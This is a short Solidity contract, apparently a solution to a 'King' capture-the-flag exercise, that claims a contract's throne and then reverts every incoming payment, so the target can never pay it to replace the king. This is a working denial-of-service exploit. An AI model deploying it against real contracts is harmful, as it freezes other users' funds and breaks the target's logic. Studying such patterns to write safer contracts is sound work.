// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
// import "hardhat/console.sol";

contract AttackingKing {
    King public king;

    constructor(address payable _contractAddress) payable {
        king = King(_contractAddress);
    }

    function hackContract() external payable {
        (bool success, ) = address(king).call{value: king.prize()}("");
        require(success, "External call failed");
    }

    receive() external payable {
        revert("Cannot claim my throne!");
    }

}
